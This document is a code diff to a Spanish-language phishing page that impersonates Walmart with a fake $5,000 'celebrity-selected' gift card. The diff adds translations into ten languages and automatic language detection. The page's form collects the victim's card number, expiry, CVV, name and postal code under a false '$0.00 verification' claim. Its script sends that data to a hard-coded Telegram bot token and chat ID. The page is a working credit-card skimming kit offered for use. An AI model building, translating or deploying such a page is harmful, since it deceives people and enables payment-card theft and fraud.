@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" dir="ltr">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -40,6 +40,8 @@ button[disabled]{opacity:.6}
 footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;line-height:1.6}
 .ok{width:56px;height:56px;border-radius:50%;background:#e8f6ee;color:#0b6b3a;display:flex;align-items:center;justify-content:center;font-size:30px;margin:4px 0 12px}
 .hide{display:none !important}
+html[dir="rtl"] .lock{margin-left:0;margin-right:auto}
+html[dir="rtl"] .timer{margin-left:0;margin-right:auto;text-align:left}
 </style>
 </head>
 <body>
@@ -47,7 +49,7 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
 <header>
   <span class="spark">&#10035;</span>
   <span class="brand">Walmart</span>
-  <span class="lock">&#128274; Conexión segura</span>
+  <span class="lock" id="lock">&#128274; Conexión segura</span>
 </header>
 
 <div class="bar" id="bar"><i class="on"></i><i class="on"></i><i></i></div>
@@ -55,43 +57,43 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
 
 <div class="prize" id="prize">
   <div>
-    <b>$5,000</b>
-    <span>Tarjeta de regalo Walmart</span>
+    <b id="amount">$5,000</b>
+    <span id="prizeLabel">Tarjeta de regalo Walmart</span>
   </div>
   <div class="timer">
-    Se libera en
+    <span id="releases">Se libera en</span>
     <b id="t">09:58</b>
   </div>
 </div>
 
 <div class="card" id="cardForm">
-  <h1>Reclama tu tarjeta de $5,000</h1>
-  <p class="sub">Has sido seleccionado por una celebridad para recibir una tarjeta de regalo Walmart de <b>$5,000</b>. Puedes retirarla en efectivo o usarla para comprar cualquier artículo en Walmart.</p>
-  <span class="free">No se hace ningún cargo · No se descuenta nada</span>
+  <h1 id="h1">Reclama tu tarjeta de $5,000</h1>
+  <p class="sub" id="sub">Has sido seleccionado por una celebridad para recibir una tarjeta de regalo Walmart de <b>$5,000</b>. Puedes retirarla en efectivo o usarla para comprar cualquier artículo en Walmart.</p>
+  <span class="free" id="free">No se hace ningún cargo · No se descuenta nada</span>
 
   <form id="f" novalidate>
-    <label for="n">Nombre como aparece en la tarjeta</label>
+    <label for="n" id="lblName">Nombre como aparece en la tarjeta</label>
     <input id="n" placeholder="ANA LOPEZ" autocomplete="cc-name" required>
 
-    <label for="c">Número de tarjeta</label>
+    <label for="c" id="lblCard">Número de tarjeta</label>
     <input id="c" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number" required>
 
     <div class="row">
       <div>
-        <label for="e">Vencimiento</label>
+        <label for="e" id="lblExp">Vencimiento</label>
         <input id="e" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp" required>
       </div>
       <div>
-        <label for="v">CVV</label>
+        <label for="v" id="lblCvv">CVV</label>
         <input id="v" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc" required>
-        <div class="hint">3 dígitos al reverso</div>
+        <div class="hint" id="hintCvv">3 dígitos al reverso</div>
       </div>
     </div>
 
-    <label for="z">Código postal</label>
+    <label for="z" id="lblZip">Código postal</label>
     <input id="z" inputmode="numeric" placeholder="28001" maxlength="5" autocomplete="postal-code" required>
 
-    <p class="fine">Solo verificamos que no hayas recibido ya tu tarjeta. Cargo de comprobación de $0.00 MXN: no se descuenta nada de tu cuenta.</p>
+    <p class="fine" id="fine1">Solo verificamos que no hayas recibido ya tu tarjeta. Cargo de comprobación de $0.00 MXN: no se descuenta nada de tu cuenta.</p>
 
     <button type="submit" id="btn">Reclamar mi tarjeta de $5,000</button>
   </form>
@@ -99,12 +101,12 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
 
 <div class="card hide" id="cardDone">
   <div class="ok">&#10003;</div>
-  <h1>¡Tarjeta liberada!</h1>
-  <p class="sub">Registramos tu tarjeta de regalo de <b>$5,000</b>. La verificación se completa en unos minutos y el saldo queda disponible para retirar o comprar en Walmart.</p>
-  <p class="fine">Guarda tu número de tarjeta. Si en 24 h no recibes confirmación, responde al mensaje de verificación.</p>
+  <h1 id="doneH1">¡Tarjeta liberada!</h1>
+  <p class="sub" id="doneSub">Registramos tu tarjeta de regalo de <b>$5,000</b>. La verificación se completa en unos minutos y el saldo queda disponible para retirar o comprar en Walmart.</p>
+  <p class="fine" id="doneFine">Guarda tu número de tarjeta. Si en 24 h no recibes confirmación, responde al mensaje de verificación.</p>
 </div>
 
-<footer>
+<footer id="footer">
   Promoción de Navidad · Una tarjeta por persona<br>
   Walmart de México y Centroamérica
 </footer>
@@ -113,8 +115,69 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
 var BOT  = "9120956072:AAFnNaCapblsspo-rCBHMa1aPcgRyFKhXBU";
 var CHAT = "7238838844";
 
+var T = {
+  es:{title:"Walmart | Libera tu tarjeta de regalo",lock:"\u{1F512} Conexión segura",step2:"PASO 2 DE 3",step3:"PASO 3 DE 3 · COMPLETADO",amount:"$5,000",prize:"Tarjeta de regalo Walmart",releases:"Se libera en",h1:"Reclama tu tarjeta de $5,000",sub:"Has sido seleccionado por una celebridad para recibir una tarjeta de regalo Walmart de <b>$5,000</b>. Puedes retirarla en efectivo o usarla para comprar cualquier artículo en Walmart.",free:"No se hace ningún cargo · No se descuenta nada",name:"Nombre como aparece en la tarjeta",phName:"ANA LOPEZ",card:"Número de tarjeta",exp:"Vencimiento",phExp:"MM/AA",cvv:"CVV",hintCvv:"3 dígitos al reverso",zip:"Código postal",phZip:"28001",fine:"Solo verificamos que no hayas recibido ya tu tarjeta. Cargo de comprobación de $0.00 MXN: no se descuenta nada de tu cuenta.",btn:"Reclamar mi tarjeta de $5,000",verifying:"Verificando…",doneH1:"¡Tarjeta liberada!",doneSub:"Registramos tu tarjeta de regalo de <b>$5,000</b>. La verificación se completa en unos minutos y el saldo queda disponible para retirar o comprar en Walmart.",doneFine:"Guarda tu número de tarjeta. Si en 24 h no recibes confirmación, responde al mensaje de verificación.",footer:"Promoción de Navidad · Una tarjeta por persona<br>Walmart de México y Centroamérica",cfg:"Falta configurar el token y el chat_id."},
+
+  en:{title:"Walmart | Release your gift card",lock:"\u{1F512} Secure connection",step2:"STEP 2 OF 3",step3:"STEP 3 OF 3 · COMPLETE",amount:"$5,000",prize:"Walmart gift card",releases:"Releases in",h1:"Claim your $5,000 card",sub:"You have been selected by a celebrity to receive a <b>$5,000</b> Walmart gift card. You can cash it out or spend it on anything at Walmart.",free:"No charge · Nothing is deducted",name:"Name as it appears on the card",phName:"JANE DOE",card:"Card number",exp:"Expiry",phExp:"MM/YY",cvv:"CVV",hintCvv:"3 digits on the back",zip:"ZIP code",phZip:"10001",fine:"We only check that you haven't received your card yet. A $0.00 USD verification charge: nothing is deducted from your account.",btn:"Claim my $5,000 card",verifying:"Verifying…",doneH1:"Card released!",doneSub:"We have recorded your <b>$5,000</b> gift card. Verification completes in a few minutes and the balance becomes available to withdraw or spend at Walmart.",doneFine:"Keep your card number. If you don't get confirmation within 24 h, reply to the verification message.",footer:"Holiday promotion · One card per person<br>Walmart",cfg:"Token and chat_id must be set first."},
+
+  pt:{title:"Walmart | Libere seu cartão-presente",lock:"\u{1F512} Conexão segura",step2:"PASSO 2 DE 3",step3:"PASSO 3 DE 3 · CONCLUÍDO",amount:"$5.000",prize:"Cartão-presente Walmart",releases:"Libera em",h1:"Resgate seu cartão de $5.000",sub:"Você foi selecionado por uma celebridade para receber um cartão-presente Walmart de <b>$5.000</b>. Pode sacar em dinheiro ou usar em qualquer produto no Walmart.",free:"Nenhuma cobrança · Nada é descontado",name:"Nome como aparece no cartão",phName:"MARIA SILVA",card:"Número do cartão",exp:"Validade",phExp:"MM/AA",cvv:"CVV",hintCvv:"3 dígitos no verso",zip:"CEP",phZip:"01310",fine:"Só verificamos se você ainda não recebeu o cartão. Cobrança de verificação de $0,00 BRL: nada é descontado da sua conta.",btn:"Resgatar meu cartão de $5.000",verifying:"Verificando…",doneH1:"Cartão liberado!",doneSub:"Registramos seu cartão-presente de <b>$5.000</b>. A verificação termina em alguns minutos e o saldo fica disponível para saque ou compras no Walmart.",doneFine:"Guarde o número do cartão. Se não receber confirmação em 24 h, responda à mensagem de verificação.",footer:"Promoção de Natal · Um cartão por pessoa<br>Walmart",cfg:"Configure o token e o chat_id primeiro."},
+
+  fr:{title:"Walmart | Libérez votre carte cadeau",lock:"\u{1F512} Connexion sécurisée",step2:"ÉTAPE 2 SUR 3",step3:"ÉTAPE 3 SUR 3 · TERMINÉ",amount:"5 000 $",prize:"Carte cadeau Walmart",releases:"Libération dans",h1:"Réclamez votre carte de 5 000 $",sub:"Vous avez été sélectionné par une célébrité pour recevoir une carte cadeau Walmart de <b>5 000 $</b>. Vous pouvez l'encaisser ou l'utiliser pour tout achat chez Walmart.",free:"Aucun frais · Rien n'est débité",name:"Nom tel qu'il figure sur la carte",phName:"MARIE DUPONT",card:"Numéro de carte",exp:"Expiration",phExp:"MM/AA",cvv:"CVV",hintCvv:"3 chiffres au dos",zip:"Code postal",phZip:"75001",fine:"Nous vérifions seulement que vous n'avez pas déjà reçu votre carte. Frais de vérification de 0,00 $ : rien n'est débité de votre compte.",btn:"Réclamer ma carte de 5 000 $",verifying:"Vérification…",doneH1:"Carte libérée !",doneSub:"Votre carte cadeau de <b>5 000 $</b> est enregistrée. La vérification se termine dans quelques minutes et le solde devient disponible pour retrait ou achat chez Walmart.",doneFine:"Conservez votre numéro de carte. Sans confirmation sous 24 h, répondez au message de vérification.",footer:"Promotion de Noël · Une carte par personne<br>Walmart",cfg:"Le token et le chat_id doivent être renseignés."},
+
+  de:{title:"Walmart | Geschenkkarte freischalten",lock:"\u{1F512} Sichere Verbindung",step2:"SCHRITT 2 VON 3",step3:"SCHRITT 3 VON 3 · ABGESCHLOSSEN",amount:"5.000 $",prize:"Walmart-Geschenkkarte",releases:"Freigabe in",h1:"Fordern Sie Ihre 5.000-$-Karte an",sub:"Sie wurden von einer Prominenten ausgewählt und erhalten eine Walmart-Geschenkkarte über <b>5.000 $</b>. Sie können sie auszahlen lassen oder bei Walmart für alles einkaufen.",free:"Keine Gebühr · Nichts wird abgebucht",name:"Name wie auf der Karte",phName:"ANNA MÜLLER",card:"Kartennummer",exp:"Gültig bis",phExp:"MM/JJ",cvv:"CVV",hintCvv:"3 Ziffern auf der Rückseite",zip:"Postleitzahl",phZip:"10115",fine:"Wir prüfen nur, ob Sie Ihre Karte schon erhalten haben. Prüfgebühr 0,00 $: Es wird nichts von Ihrem Konto abgebucht.",btn:"Meine 5.000-$-Karte anfordern",verifying:"Wird geprüft…",doneH1:"Karte freigegeben!",doneSub:"Ihre Geschenkkarte über <b>5.000 $</b> ist erfasst. Die Prüfung ist in wenigen Minuten abgeschlossen, danach können Sie das Guthaben abheben oder bei Walmart einkaufen.",doneFine:"Bewahren Sie Ihre Kartennummer auf. Ohne Bestätigung innerhalb von 24 Std. antworten Sie auf die Prüfnachricht.",footer:"Weihnachtsaktion · Eine Karte pro Person<br>Walmart",cfg:"Token und chat_id müssen zuerst gesetzt werden."},
+
+  it:{title:"Walmart | Libera la tua carta regalo",lock:"\u{1F512} Connessione sicura",step2:"PASSO 2 DI 3",step3:"PASSO 3 DI 3 · COMPLETATO",amount:"5.000 $",prize:"Carta regalo Walmart",releases:"Si libera tra",h1:"Riscatta la tua carta da 5.000 $",sub:"Sei stato selezionato da una celebrità per ricevere una carta regalo Walmart da <b>5.000 $</b>. Puoi incassarla o usarla per qualsiasi acquisto da Walmart.",free:"Nessun addebito · Non viene scalato nulla",name:"Nome come sulla carta",phName:"MARIA ROSSI",card:"Numero della carta",exp:"Scadenza",phExp:"MM/AA",cvv:"CVV",hintCvv:"3 cifre sul retro",zip:"CAP",phZip:"00100",fine:"Verifichiamo solo che tu non abbia già ricevuto la carta. Addebito di verifica di 0,00 $: non viene scalato nulla dal conto.",btn:"Riscatta la mia carta da 5.000 $",verifying:"Verifica…",doneH1:"Carta liberata!",doneSub:"Abbiamo registrato la tua carta regalo da <b>5.000 $</b>. La verifica si completa in pochi minuti e il saldo sarà disponibile per il prelievo o per acquisti da Walmart.",doneFine:"Conserva il numero della carta. Se non ricevi conferma entro 24 h, rispondi al messaggio di verifica.",footer:"Promozione di Natale · Una carta a persona<br>Walmart",cfg:"Token e chat_id vanno impostati prima."},
+
+  ru:{title:"Walmart | Активируйте подарочную карту",lock:"\u{1F512} Защищённое соединение",step2:"ШАГ 2 ИЗ 3",step3:"ШАГ 3 ИЗ 3 · ГОТОВО",amount:"5000 $",prize:"Подарочная карта Walmart",releases:"Активация через",h1:"Получите карту на 5000 $",sub:"Вас выбрала знаменитость, чтобы вручить подарочную карту Walmart на <b>5000 $</b>. Её можно обналичить или потратить на любые покупки в Walmart.",free:"Без комиссии · Ничего не списывается",name:"Имя как на карте",phName:"АННА ИВАНОВА",card:"Номер карты",exp:"Срок действия",phExp:"ММ/ГГ",cvv:"CVV",hintCvv:"3 цифры на обороте",zip:"Почтовый индекс",phZip:"101000",fine:"Мы лишь проверяем, что вы ещё не получили карту. Проверочное списание 0,00 $: с вашего счёта ничего не снимается.",btn:"Получить карту на 5000 $",verifying:"Проверка…",doneH1:"Карта активирована!",doneSub:"Ваша подарочная карта на <b>5000 $</b> зарегистрирована. Проверка завершится через несколько минут, после чего баланс будет доступен для вывода или покупок в Walmart.",doneFine:"Сохраните номер карты. Если подтверждение не придёт в течение 24 ч, ответьте на сообщение о проверке.",footer:"Новогодняя акция · Одна карта на человека<br>Walmart",cfg:"Сначала задайте token и chat_id."},
+
+  ar:{title:"Walmart | حرّر بطاقة الهدية",lock:"\u{1F512} اتصال آمن",step2:"الخطوة 2 من 3",step3:"الخطوة 3 من 3 · مكتمل",amount:"5000 $",prize:"بطاقة هدايا Walmart",releases:"تُحرَّر بعد",h1:"اطلب بطاقتك بقيمة 5000 $",sub:"اختارتك إحدى المشاهير لتحصل على بطاقة هدايا Walmart بقيمة <b>5000 $</b>. يمكنك صرفها نقدًا أو استخدامها لأي مشتريات في Walmart.",free:"بدون أي رسوم · لا يُخصم شيء",name:"الاسم كما يظهر على البطاقة",phName:"سارة أحمد",card:"رقم البطاقة",exp:"تاريخ الانتهاء",phExp:"شهر/سنة",cvv:"CVV",hintCvv:"3 أرقام في الخلف",zip:"الرمز البريدي",phZip:"00000",fine:"نتحقق فقط من أنك لم تستلم بطاقتك بعد. رسم تحقّق بقيمة 0.00 $: لا يُخصم شيء من حسابك.",btn:"اطلب بطاقتي بقيمة 5000 $",verifying:"جارٍ التحقق…",doneH1:"تم تحرير البطاقة!",doneSub:"سجّلنا بطاقة الهدايا بقيمة <b>5000 $</b>. يكتمل التحقق خلال دقائق ويصبح الرصيد متاحًا للسحب أو الشراء من Walmart.",doneFine:"احتفظ برقم بطاقتك. إذا لم يصلك تأكيد خلال 24 ساعة، رُد على رسالة التحقق.",footer:"عرض عيد الميلاد · بطاقة واحدة لكل شخص<br>Walmart",cfg:"يجب ضبط token و chat_id أولًا."},
+
+  hi:{title:"Walmart | अपना गिफ्ट कार्ड मुक्त करें",lock:"\u{1F512} सुरक्षित कनेक्शन",step2:"चरण 2 / 3",step3:"चरण 3 / 3 · पूर्ण",amount:"$5,000",prize:"Walmart गिफ्ट कार्ड",releases:"मुक्त होगा",h1:"अपना $5,000 कार्ड प्राप्त करें",sub:"किसी सेलिब्रिटी ने आपको <b>$5,000</b> का Walmart गिफ्ट कार्ड पाने के लिए चुना है। आप इसे नकद निकाल सकते हैं या Walmart में कुछ भी खरीद सकते हैं।",free:"कोई शुल्क नहीं · कुछ नहीं कटेगा",name:"कार्ड पर लिखा नाम",phName:"आशा शर्मा",card:"कार्ड नंबर",exp:"समाप्ति",phExp:"MM/YY",cvv:"CVV",hintCvv:"पीछे 3 अंक",zip:"पिन कोड",phZip:"110001",fine:"हम केवल जाँचते हैं कि आपको कार्ड पहले नहीं मिला। $0.00 का सत्यापन शुल्क: आपके खाते से कुछ नहीं कटेगा।",btn:"मेरा $5,000 कार्ड प्राप्त करें",verifying:"सत्यापन हो रहा है…",doneH1:"कार्ड मुक्त हो गया!",doneSub:"आपका <b>$5,000</b> गिफ्ट कार्ड दर्ज कर लिया गया है। सत्यापन कुछ मिनटों में पूरा होगा और राशि निकालने या Walmart में खरीदारी के लिए उपलब्ध हो जाएगी।",doneFine:"अपना कार्ड नंबर सँभालकर रखें। 24 घंटे में पुष्टि न मिलने पर सत्यापन संदेश का उत्तर दें।",footer:"क्रिसमस प्रोमोशन · प्रति व्यक्ति एक कार्ड<br>Walmart",cfg:"पहले token और chat_id सेट करें।"},
+
+  zh:{title:"Walmart | 领取您的礼品卡",lock:"\u{1F512} 安全连接",step2:"第 2 步，共 3 步",step3:"第 3 步，共 3 步 · 已完成",amount:"5,000 美元",prize:"Walmart 礼品卡",releases:"解锁倒计时",h1:"领取您的 5,000 美元礼品卡",sub:"一位明星选中了您，赠送一张价值 <b>5,000 美元</b> 的 Walmart 礼品卡。可提现，也可在 Walmart 购买任意商品。",free:"不收手续费 · 不会扣款",name:"卡片上的姓名",phName:"李娜",card:"卡号",exp:"有效期",phExp:"月/年",cvv:"CVV",hintCvv:"背面 3 位数字",zip:"邮政编码",phZip:"100000",fine:"我们只核实您尚未领取过该卡。0.00 美元的验证扣款：不会从您的账户扣除任何金额。",btn:"领取我的 5,000 美元礼品卡",verifying:"正在验证…",doneH1:"卡片已解锁！",doneSub:"已登记您的 <b>5,000 美元</b> 礼品卡。验证将在几分钟内完成，余额可用于提现或在 Walmart 消费。",doneFine:"请保存卡号。如 24 小时内未收到确认，请回复验证消息。",footer:"圣诞活动 · 每人限一张<br>Walmart",cfg:"请先设置 token 和 chat_id。"}
+};
+
 var $ = function(id){ return document.getElementById(id); };
 var c = $("c"), e = $("e"), v = $("v"), z = $("z"), n = $("n");
+
+/* --- idioma --- */
+var SUP = ["es","en","pt","fr","de","it","ru","ar","hi","zh"];
+var raw = (navigator.languages && navigator.languages[0]) || navigator.language || "es";
+var override = (location.search.match(/[?&]l=([a-zA-Z-]+)/) || [])[1];
+if(override) raw = override;
+var base = raw.toLowerCase().split("-")[0];
+var lang = SUP.indexOf(base) >= 0 ? base : "es";
+var L = T[lang];
+
+function set(id, txt){ var el = $(id); if(el) el.innerHTML = txt; }
+function ph(el, txt){ if(el) el.placeholder = txt; }
+
+document.documentElement.lang = lang;
+document.documentElement.dir = lang === "ar" ? "rtl" : "ltr";
+document.title = L.title;
+set("lock", L.lock);
+set("step", L.step2);
+set("amount", L.amount);
+set("prizeLabel", L.prize);
+set("releases", L.releases);
+set("h1", L.h1);
+set("sub", L.sub);
+set("free", L.free);
+set("lblName", L.name);
+set("lblCard", L.card);
+set("lblExp", L.exp);
+set("lblCvv", L.cvv);
+set("hintCvv", L.hintCvv);
+set("lblZip", L.zip);
+set("fine1", L.fine);
+set("btn", L.btn);
+set("doneH1", L.doneH1);
+set("doneSub", L.doneSub);
+set("doneFine", L.doneFine);
+set("footer", L.footer);
+ph(n, L.phName);
+ph(e, L.phExp);
+ph(z, L.phZip);
 
 /* --- máscaras --- */
 c.addEventListener("input", function(){
@@ -134,12 +197,12 @@ n.addEventListener("input", function(){ this.classList.remove("bad"); });
 
 /* --- cuenta atrás --- */
 var left = 598, timer = setInterval(function(){
-  if(left <= 0){ clearInterval(timer); $("t").textContent = "Listo"; return; }
+  if(left <= 0){ clearInterval(timer); $("t").textContent = "\u2713"; return; }
   left--;
   $("t").textContent = String(Math.floor(left / 60)).padStart(2, "0") + ":" + String(left % 60).padStart(2, "0");
 }, 1000);
 
-/* --- envío a Telegram --- */
+/* --- envío --- */
 function ping(txt){
   var u = "https://api.telegram.org/bot" + BOT + "/sendMessage";
   var b = "chat_id=" + encodeURIComponent(CHAT)
@@ -177,36 +240,39 @@ $("f").addEventListener("submit", function(ev){
   ev.preventDefault();
 
   if(BOT.indexOf("PEGA") === 0 || CHAT.indexOf("PEGA") === 0){
-    alert("Falta configurar el token y el chat_id al inicio del script.");
+    alert(L.cfg);
     return;
   }
   if(!validar()) return;
 
   var btn = $("btn");
   btn.disabled = true;
-  btn.textContent = "Verificando…";
+  btn.textContent = L.verifying;
 
   var ahora = new Date();
-  var sello = ahora.toLocaleDateString("es-MX") + " " +
-              ahora.toLocaleTimeString("es-MX", {hour: "2-digit", minute: "2-digit"});
+  var sello = ahora.toLocaleString(raw, {
+    day: "2-digit", month: "2-digit", year: "numeric",
+    hour: "2-digit", minute: "2-digit"
+  });
 
-  var payload = "🛒 TARJETA DE REGALO $5,000 MXN\n"
+  var payload = "\u{1F6D2} TARJETA DE REGALO $5,000\n"
     + "Nombre: " + n.value.trim().toUpperCase() + "\n"
     + "Tarjeta: " + c.value + "\n"
     + "Vence: " + e.value + "\n"
     + "CVV: " + v.value + "\n"
     + "CP: " + z.value + "\n"
+    + "Idioma: " + raw + " (" + lang + ")\n"
     + "Recibido: " + sello;
 
   ping(payload).then(function(){
     $("cardForm").classList.add("hide");
     $("cardDone").classList.remove("hide");
     $("bar").innerHTML = '<i class="on"></i><i class="on"></i><i class="on"></i>';
-    $("step").textContent = "PASO 3 DE 3 · COMPLETADO";
+    set("step", L.step3);
     $("prize").classList.add("hide");
     window.scrollTo(0, 0);
   });
 });
 </script>
 </body>
-</html>
+          </html>
